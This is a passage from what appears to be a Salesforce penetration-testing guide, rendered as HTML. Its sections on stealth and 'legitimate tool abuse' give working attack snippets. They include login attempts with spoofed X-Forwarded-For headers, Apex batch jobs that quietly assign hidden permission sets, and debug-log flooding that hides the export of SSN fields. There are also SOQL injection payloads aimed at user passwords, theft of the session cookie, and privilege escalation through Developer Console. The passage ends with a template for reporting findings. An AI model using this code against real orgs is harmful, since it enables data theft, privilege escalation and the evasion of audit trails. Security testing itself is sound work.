</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#__codelineno-81-10"></a>        <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&#39;</span>
</span><span id="__span-81-11"><a id="__codelineno-81-11" name="__codelineno-81-11" href="#__codelineno-81-11"></a>    <span class="p">]</span>
</span><span id="__span-81-12"><a id="__codelineno-81-12" name="__codelineno-81-12" href="#__codelineno-81-12"></a>
</span><span id="__span-81-13"><a id="__codelineno-81-13" name="__codelineno-81-13" href="#__codelineno-81-13"></a>    <span class="c1"># Vary source IPs (if possible)</span>
</span><span id="__span-81-14"><a id="__codelineno-81-14" name="__codelineno-81-14" href="#__codelineno-81-14"></a>    <span class="n">proxy_ips</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;192.168.1.10&#39;</span><span class="p">,</span> <span class="s1">&#39;10.0.0.5&#39;</span><span class="p">,</span> <span class="s1">&#39;172.16.0.20&#39;</span><span class="p">]</span>
</span><span id="__span-81-15"><a id="__codelineno-81-15" name="__codelineno-81-15" href="#__codelineno-81-15"></a>
</span><span id="__span-81-16"><a id="__codelineno-81-16" name="__codelineno-81-16" href="#__codelineno-81-16"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
</span><span id="__span-81-17"><a id="__codelineno-81-17" name="__codelineno-81-17" href="#__codelineno-81-17"></a>        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-81-18"><a id="__codelineno-81-18" name="__codelineno-81-18" href="#__codelineno-81-18"></a>            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">user_agents</span><span class="p">),</span>
</span><span id="__span-81-19"><a id="__codelineno-81-19" name="__codelineno-81-19" href="#__codelineno-81-19"></a>            <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">proxy_ips</span><span class="p">)</span>
</span><span id="__span-81-20"><a id="__codelineno-81-20" name="__codelineno-81-20" href="#__codelineno-81-20"></a>        <span class="p">}</span>
</span><span id="__span-81-21"><a id="__codelineno-81-21" name="__codelineno-81-21" href="#__codelineno-81-21"></a>
</span><span id="__span-81-22"><a id="__codelineno-81-22" name="__codelineno-81-22" href="#__codelineno-81-22"></a>        <span class="c1"># Perform login with variation</span>
</span><span id="__span-81-23"><a id="__codelineno-81-23" name="__codelineno-81-23" href="#__codelineno-81-23"></a>        <span class="n">login_data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;pw&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span><span id="__span-81-24"><a id="__codelineno-81-24" name="__codelineno-81-24" href="#__codelineno-81-24"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-81-25"><a id="__codelineno-81-25" name="__codelineno-81-25" href="#__codelineno-81-25"></a>            <span class="s1">&#39;https://instance.salesforce.com/login.jsp&#39;</span><span class="p">,</span>
</span><span id="__span-81-26"><a id="__codelineno-81-26" name="__codelineno-81-26" href="#__codelineno-81-26"></a>            <span class="n">data</span><span class="o">=</span><span class="n">login_data</span><span class="p">,</span>
</span><span id="__span-81-27"><a id="__codelineno-81-27" name="__codelineno-81-27" href="#__codelineno-81-27"></a>            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-81-28"><a id="__codelineno-81-28" name="__codelineno-81-28" href="#__codelineno-81-28"></a>        <span class="p">)</span>
</span><span id="__span-81-29"><a id="__codelineno-81-29" name="__codelineno-81-29" href="#__codelineno-81-29"></a>
</span><span id="__span-81-30"><a id="__codelineno-81-30" name="__codelineno-81-30" href="#__codelineno-81-30"></a>        <span class="c1"># Random delay between attempts</span>
</span><span id="__span-81-31"><a id="__codelineno-81-31" name="__codelineno-81-31" href="#__codelineno-81-31"></a>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">300</span><span class="p">))</span>  <span class="c1"># 30 seconds to 5 minutes</span>
</span></code></pre></div></p>
<p><strong>Setup Audit Trail Evasion</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>public class AuditEvasion {
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>    public static void performStealthyActions() {
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>        // Use anonymous blocks to reduce attribution
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>        Database.executeBatch(new StealthyBatch(), 1);
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>    }
</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>
</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#__codelineno-82-7"></a>    // Batch job to distribute actions across time
</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8" href="#__codelineno-82-8"></a>    public class StealthyBatch implements Database.Batchable&lt;SObject&gt; {
</span><span id="__span-82-9"><a id="__codelineno-82-9" name="__codelineno-82-9" href="#__codelineno-82-9"></a>        public Database.QueryLocator start(Database.BatchableContext bc) {
</span><span id="__span-82-10"><a id="__codelineno-82-10" name="__codelineno-82-10" href="#__codelineno-82-10"></a>            return Database.getQueryLocator(&#39;SELECT Id FROM Account LIMIT 1&#39;);
</span><span id="__span-82-11"><a id="__codelineno-82-11" name="__codelineno-82-11" href="#__codelineno-82-11"></a>        }
</span><span id="__span-82-12"><a id="__codelineno-82-12" name="__codelineno-82-12" href="#__codelineno-82-12"></a>
</span><span id="__span-82-13"><a id="__codelineno-82-13" name="__codelineno-82-13" href="#__codelineno-82-13"></a>        public void execute(Database.BatchableContext bc, List&lt;Account&gt; records) {
</span><span id="__span-82-14"><a id="__codelineno-82-14" name="__codelineno-82-14" href="#__codelineno-82-14"></a>            // Perform malicious actions in small batches
</span><span id="__span-82-15"><a id="__codelineno-82-15" name="__codelineno-82-15" href="#__codelineno-82-15"></a>            List&lt;User&gt; users = [SELECT Id, IsActive FROM User WHERE Profile.Name != &#39;System Administrator&#39; LIMIT 5];
</span><span id="__span-82-16"><a id="__codelineno-82-16" name="__codelineno-82-16" href="#__codelineno-82-16"></a>
</span><span id="__span-82-17"><a id="__codelineno-82-17" name="__codelineno-82-17" href="#__codelineno-82-17"></a>            for (User u : users) {
</span><span id="__span-82-18"><a id="__codelineno-82-18" name="__codelineno-82-18" href="#__codelineno-82-18"></a>                // Make subtle privilege changes
</span><span id="__span-82-19"><a id="__codelineno-82-19" name="__codelineno-82-19" href="#__codelineno-82-19"></a>                try {
</span><span id="__span-82-20"><a id="__codelineno-82-20" name="__codelineno-82-20" href="#__codelineno-82-20"></a>                    // Assign temporary permission set
</span><span id="__span-82-21"><a id="__codelineno-82-21" name="__codelineno-82-21" href="#__codelineno-82-21"></a>                    PermissionSetAssignment psa = new PermissionSetAssignment(
</span><span id="__span-82-22"><a id="__codelineno-82-22" name="__codelineno-82-22" href="#__codelineno-82-22"></a>                        PermissionSetId = &#39;HIDDEN_PERMISSION_SET_ID&#39;,
</span><span id="__span-82-23"><a id="__codelineno-82-23" name="__codelineno-82-23" href="#__codelineno-82-23"></a>                        AssigneeId = u.Id,
</span><span id="__span-82-24"><a id="__codelineno-82-24" name="__codelineno-82-24" href="#__codelineno-82-24"></a>                        ExpirationDate = Date.today().addDays(1)  // Temporary assignment
</span><span id="__span-82-25"><a id="__codelineno-82-25" name="__codelineno-82-25" href="#__codelineno-82-25"></a>                    );
</span><span id="__span-82-26"><a id="__codelineno-82-26" name="__codelineno-82-26" href="#__codelineno-82-26"></a>                    insert psa;
</span><span id="__span-82-27"><a id="__codelineno-82-27" name="__codelineno-82-27" href="#__codelineno-82-27"></a>                } catch (Exception e) {
</span><span id="__span-82-28"><a id="__codelineno-82-28" name="__codelineno-82-28" href="#__codelineno-82-28"></a>                    // Fail silently
</span><span id="__span-82-29"><a id="__codelineno-82-29" name="__codelineno-82-29" href="#__codelineno-82-29"></a>                }
</span><span id="__span-82-30"><a id="__codelineno-82-30" name="__codelineno-82-30" href="#__codelineno-82-30"></a>            }
</span><span id="__span-82-31"><a id="__codelineno-82-31" name="__codelineno-82-31" href="#__codelineno-82-31"></a>        }
</span><span id="__span-82-32"><a id="__codelineno-82-32" name="__codelineno-82-32" href="#__codelineno-82-32"></a>
</span><span id="__span-82-33"><a id="__codelineno-82-33" name="__codelineno-82-33" href="#__codelineno-82-33"></a>        public void finish(Database.BatchableContext bc) {
</span><span id="__span-82-34"><a id="__codelineno-82-34" name="__codelineno-82-34" href="#__codelineno-82-34"></a>            // Clean up after batch completion
</span><span id="__span-82-35"><a id="__codelineno-82-35" name="__codelineno-82-35" href="#__codelineno-82-35"></a>        }
</span><span id="__span-82-36"><a id="__codelineno-82-36" name="__codelineno-82-36" href="#__codelineno-82-36"></a>    }
</span><span id="__span-82-37"><a id="__codelineno-82-37" name="__codelineno-82-37" href="#__codelineno-82-37"></a>}
</span></code></pre></div></p>
<p><strong>Debug Log Pollution</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>public class LogPollution {
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>    public static void polluteLogs() {
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>        // Generate high volume of legitimate-looking debug logs
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>        for (Integer i = 0; i &lt; 1000; i++) {
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a>            System.debug(&#39;Processing record batch: &#39; + i);
</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>            System.debug(&#39;Validation check passed for item: &#39; + i);
</span><span id="__span-83-7"><a id="__codelineno-83-7" name="__codelineno-83-7" href="#__codelineno-83-7"></a>            System.debug(&#39;Business rule applied successfully: &#39; + i);
</span><span id="__span-83-8"><a id="__codelineno-83-8" name="__codelineno-83-8" href="#__codelineno-83-8"></a>        }
</span><span id="__span-83-9"><a id="__codelineno-83-9" name="__codelineno-83-9" href="#__codelineno-83-9"></a>
</span><span id="__span-83-10"><a id="__codelineno-83-10" name="__codelineno-83-10" href="#__codelineno-83-10"></a>        // Hide malicious activity within noise
</span><span id="__span-83-11"><a id="__codelineno-83-11" name="__codelineno-83-11" href="#__codelineno-83-11"></a>        List&lt;Contact&gt; contacts = [SELECT Id, Name, SSN__c FROM Contact LIMIT 100];
</span><span id="__span-83-12"><a id="__codelineno-83-12" name="__codelineno-83-12" href="#__codelineno-83-12"></a>        System.debug(&#39;Processing contact records: &#39; + contacts.size());
</span><span id="__span-83-13"><a id="__codelineno-83-13" name="__codelineno-83-13" href="#__codelineno-83-13"></a>
</span><span id="__span-83-14"><a id="__codelineno-83-14" name="__codelineno-83-14" href="#__codelineno-83-14"></a>        // Actual malicious activity disguised as routine processing
</span><span id="__span-83-15"><a id="__codelineno-83-15" name="__codelineno-83-15" href="#__codelineno-83-15"></a>        for (Contact c : contacts) {
</span><span id="__span-83-16"><a id="__codelineno-83-16" name="__codelineno-83-16" href="#__codelineno-83-16"></a>            if (c.SSN__c != null) {
</span><span id="__span-83-17"><a id="__codelineno-83-17" name="__codelineno-83-17" href="#__codelineno-83-17"></a>                // Exfiltrate data disguised as routine logging
</span><span id="__span-83-18"><a id="__codelineno-83-18" name="__codelineno-83-18" href="#__codelineno-83-18"></a>                System.debug(&#39;Contact processed: ID=&#39; + c.Id + &#39; Data=&#39; + c.SSN__c);
</span><span id="__span-83-19"><a id="__codelineno-83-19" name="__codelineno-83-19" href="#__codelineno-83-19"></a>            }
</span><span id="__span-83-20"><a id="__codelineno-83-20" name="__codelineno-83-20" href="#__codelineno-83-20"></a>        }
</span><span id="__span-83-21"><a id="__codelineno-83-21" name="__codelineno-83-21" href="#__codelineno-83-21"></a>    }
</span><span id="__span-83-22"><a id="__codelineno-83-22" name="__codelineno-83-22" href="#__codelineno-83-22"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Reduced forensic evidence, investigation hindrance, detection avoidance.</p>
<h3 id="2-legitimate-tool-abuse">2. Legitimate Tool Abuse</h3>
<p><strong>Objective</strong>: Using authorized tools and features for malicious purposes to avoid detection.</p>
<p><strong>Data Loader Abuse</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">abuse_data_loader</span><span class="p">():</span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Use Data Loader for bulk data extraction&quot;&quot;&quot;</span>
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>    <span class="c1"># Configure Data Loader for extraction</span>
</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>    <span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a>        <span class="s1">&#39;sfdc.endpoint&#39;</span><span class="p">:</span> <span class="s1">&#39;https://instance.salesforce.com&#39;</span><span class="p">,</span>
</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a>        <span class="s1">&#39;sfdc.username&#39;</span><span class="p">:</span> <span class="s1">&#39;legitimate_user@company.com&#39;</span><span class="p">,</span>
</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7" href="#__codelineno-84-7"></a>        <span class="s1">&#39;sfdc.password&#39;</span><span class="p">:</span> <span class="s1">&#39;password_with_token&#39;</span><span class="p">,</span>
</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8" href="#__codelineno-84-8"></a>        <span class="s1">&#39;process.operation&#39;</span><span class="p">:</span> <span class="s1">&#39;extract&#39;</span><span class="p">,</span>
</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9" href="#__codelineno-84-9"></a>        <span class="s1">&#39;process.mappingFile&#39;</span><span class="p">:</span> <span class="s1">&#39;contact_mapping.sdl&#39;</span><span class="p">,</span>
</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10" href="#__codelineno-84-10"></a>        <span class="s1">&#39;dataAccess.type&#39;</span><span class="p">:</span> <span class="s1">&#39;csvRead&#39;</span><span class="p">,</span>
</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11" href="#__codelineno-84-11"></a>        <span class="s1">&#39;dataAccess.name&#39;</span><span class="p">:</span> <span class="s1">&#39;contacts_extract.csv&#39;</span>
</span><span id="__span-84-12"><a id="__codelineno-84-12" name="__codelineno-84-12" href="#__codelineno-84-12"></a>    <span class="p">}</span>
</span><span id="__span-84-13"><a id="__codelineno-84-13" name="__codelineno-84-13" href="#__codelineno-84-13"></a>
</span><span id="__span-84-14"><a id="__codelineno-84-14" name="__codelineno-84-14" href="#__codelineno-84-14"></a>    <span class="c1"># Extract appears as routine data maintenance</span>
</span><span id="__span-84-15"><a id="__codelineno-84-15" name="__codelineno-84-15" href="#__codelineno-84-15"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Performing routine data synchronization...&quot;</span><span class="p">)</span>
</span><span id="__span-84-16"><a id="__codelineno-84-16" name="__codelineno-84-16" href="#__codelineno-84-16"></a>    <span class="c1"># Data Loader extraction process</span>
</span></code></pre></div></p>
<p><strong>Workbench Exploitation</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="c1">// Use Workbench for SOQL injection testing disguised as data analysis</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">malicious_queries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="w">    </span><span class="s2">&quot;SELECT Id, Name FROM Account WHERE Name = &#39;x&#39; UNION SELECT Id, Password__c FROM User--&quot;</span><span class="p">,</span>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="w">    </span><span class="s2">&quot;SELECT Id FROM Contact WHERE Email = &#39;test&#39; OR (SELECT COUNT() FROM User WHERE Profile.Name = &#39;System Administrator&#39;) &gt; 0--&quot;</span>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a><span class="p">];</span>
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a>
</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a><span class="c1">// Execute via Workbench query interface</span>
</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a><span class="nx">malicious_queries</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">query</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-85-9"><a id="__codelineno-85-9" name="__codelineno-85-9" href="#__codelineno-85-9"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Executing data analysis query:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">query</span><span class="p">);</span>
</span><span id="__span-85-10"><a id="__codelineno-85-10" name="__codelineno-85-10" href="#__codelineno-85-10"></a><span class="w">    </span><span class="c1">// Execute through Workbench UI</span>
</span><span id="__span-85-11"><a id="__codelineno-85-11" name="__codelineno-85-11" href="#__codelineno-85-11"></a><span class="p">});</span>
</span></code></pre></div></p>
<p><strong>Developer Console Abuse</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>// Execute malicious code via Developer Console anonymous blocks
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>// Appears as routine development/debugging activity
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>// Data exfiltration disguised as debugging
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>List&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE AnnualRevenue &gt; 1000000];
</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a>System.debug(&#39;High value accounts analysis:&#39;);
</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a>for (Account a : accounts) {
</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a>    System.debug(&#39;Account: &#39; + a.Name + &#39; Revenue: &#39; + a.AnnualRevenue);
</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a>    // Data captured in debug logs for extraction
</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a>}
</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a>
</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a>// Privilege escalation disguised as testing
</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a>User testUser = [SELECT Id FROM User WHERE Username = &#39;target@company.com&#39;];
</span><span id="__span-86-14"><a id="__codelineno-86-14" name="__codelineno-86-14" href="#__codelineno-86-14"></a>PermissionSetAssignment psa = new PermissionSetAssignment(
</span><span id="__span-86-15"><a id="__codelineno-86-15" name="__codelineno-86-15" href="#__codelineno-86-15"></a>    PermissionSetId = &#39;HIGH_PRIVILEGE_PERMISSION_SET_ID&#39;,
</span><span id="__span-86-16"><a id="__codelineno-86-16" name="__codelineno-86-16" href="#__codelineno-86-16"></a>    AssigneeId = testUser.Id
</span><span id="__span-86-17"><a id="__codelineno-86-17" name="__codelineno-86-17" href="#__codelineno-86-17"></a>);
</span><span id="__span-86-18"><a id="__codelineno-86-18" name="__codelineno-86-18" href="#__codelineno-86-18"></a>insert psa;
</span><span id="__span-86-19"><a id="__codelineno-86-19" name="__codelineno-86-19" href="#__codelineno-86-19"></a>System.debug(&#39;Test permission assignment completed&#39;);
</span></code></pre></div></p>
<p><strong>Browser Extension Abuse</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="c1">// Use Salesforce Inspector for session manipulation</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a><span class="c1">// Disguised as routine administrative tasks</span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>
</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a><span class="c1">// Extract session information</span>
</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a><span class="kd">const</span><span class="w"> </span><span class="nx">sessionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/sid_Client=([^;]+)/</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span>
</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Current session for backup:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">sessionId</span><span class="p">);</span>
</span><span id="__span-87-7"><a id="__codelineno-87-7" name="__codelineno-87-7" href="#__codelineno-87-7"></a>
</span><span id="__span-87-8"><a id="__codelineno-87-8" name="__codelineno-87-8" href="#__codelineno-87-8"></a><span class="c1">// Manipulate user records through Inspector</span>
</span><span id="__span-87-9"><a id="__codelineno-87-9" name="__codelineno-87-9" href="#__codelineno-87-9"></a><span class="kd">const</span><span class="w"> </span><span class="nx">userData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-87-10"><a id="__codelineno-87-10" name="__codelineno-87-10" href="#__codelineno-87-10"></a><span class="w">    </span><span class="nx">Id</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;005XX000001b0Qw&#39;</span><span class="p">,</span>
</span><span id="__span-87-11"><a id="__codelineno-87-11" name="__codelineno-87-11" href="#__codelineno-87-11"></a><span class="w">    </span><span class="nx">IsActive</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
</span><span id="__span-87-12"><a id="__codelineno-87-12" name="__codelineno-87-12" href="#__codelineno-87-12"></a><span class="w">    </span><span class="nx">ProfileId</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;STANDARD_PROFILE_ID&#39;</span>
</span><span id="__span-87-13"><a id="__codelineno-87-13" name="__codelineno-87-13" href="#__codelineno-87-13"></a><span class="p">};</span>
</span><span id="__span-87-14"><a id="__codelineno-87-14" name="__codelineno-87-14" href="#__codelineno-87-14"></a>
</span><span id="__span-87-15"><a id="__codelineno-87-15" name="__codelineno-87-15" href="#__codelineno-87-15"></a><span class="c1">// Use Inspector&#39;s data manipulation features</span>
</span><span id="__span-87-16"><a id="__codelineno-87-16" name="__codelineno-87-16" href="#__codelineno-87-16"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Updating user configuration:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">userData</span><span class="p">);</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Detection avoidance through legitimate tool usage, plausible deniability.</p>
<hr />
<h2 id="reporting-evidence-collection">Reporting &amp; Evidence Collection</h2>
<h3 id="1-critical-findings-documentation">1. Critical Findings Documentation</h3>
<p><strong>Objective</strong>: Systematically document security vulnerabilities with evidence and impact assessment.</p>
<p><strong>Finding Template Structure</strong>:
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="gu">## Finding: [Vulnerability Name]</span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>
</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="gu">### Executive Summary</span>
</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>Brief description of the vulnerability and its business impact.
</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>
</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a><span class="gu">### Technical Details</span>
</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a><span class="gs">**Vulnerability Type**</span>: [OWASP Category]
</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a><span class="gs">**CVSS Score**</span>: [Score/10]
</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a><span class="gs">**Risk Level**</span>: [Critical/High/Medium/Low]
</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a>
</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a><span class="gu">### Root Cause Analysis</span>
</span><span id="__span-88-12"><a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a>Detailed explanation of the underlying security flaw.
</span><span id="__span-88-13"><a id="__codelineno-88-13" name="__codelineno-88-13" href="#__codelineno-88-13"></a>
</span><span id="__span-88-14"><a id="__codelineno-88-14" name="__codelineno-88-14" href="#__codelineno-88-14"></a><span class="gu">### Proof of Concept</span>
</span><span id="__span-88-15"><a id="__codelineno-88-15" name="__codelineno-88-15" href="#__codelineno-88-15"></a>Step-by-step reproduction instructions with screenshots/code.
</span><span id="__span-88-16"><a id="__codelineno-88-16" name="__codelineno-88-16" href="#__codelineno-88-16"></a>
</span><span id="__span-88-17"><a id="__codelineno-88-17" name="__codelineno-88-17" href="#__codelineno-88-17"></a><span class="gu">### Evidence</span>
</span><span id="__span-88-18"><a id="__codelineno-88-18" name="__codelineno-88-18" href="#__codelineno-88-18"></a><span class="k">-</span><span class="w"> </span>Screenshots of vulnerable configurations
</span><span id="__span-88-19"><a id="__codelineno-88-19" name="__codelineno-88-19" href="#__codelineno-88-19"></a><span class="k">-</span><span class="w"> </span>Code snippets demonstrating the flaw
</span><span id="__span-88-20"><a id="__codelineno-88-20" name="__codelineno-88-20" href="#__codelineno-88-20"></a><span class="k">-</span><span class="w"> </span>SOQL query results showing data exposure
</span><span id="__span-88-21"><a id="__codelineno-88-21" name="__codelineno-88-21" href="#__codelineno-88-21"></a><span class="k">-</span><span class="w"> </span>API response samples
</span><span id="__span-88-22"><a id="__codelineno-88-22" name="__codelineno-88-22" href="#__codelineno-88-22"></a>
</span><span id="__span-88-23"><a id="__codelineno-88-23" name="__codelineno-88-23" href="#__codelineno-88-23"></a><span class="gu">### Business Impact</span>
</span><span id="__span-88-24"><a id="__codelineno-88-24" name="__codelineno-88-24" href="#__codelineno-88-24"></a><span class="k">-</span><span class="w"> </span>Data confidentiality impact
</span><span id="__span-88-25"><a id="__codelineno-88-25" name="__codelineno-88-25" href="#__codelineno-88-25"></a><span class="k">-</span><span class="w"> </span>Integrity concerns
</span><span id="__span-88-26"><a id="__codelineno-88-26" name="__codelineno-88-26" href="#__codelineno-88-26"></a><span class="k">-</span><span class="w"> </span>Availability risks
</span><span id="__span-88-27"><a id="__codelineno-88-27" name="__codelineno-88-27" href="#__codelineno-88-27"></a><span class="k">-</span><span class="w"> </span>Compliance implications
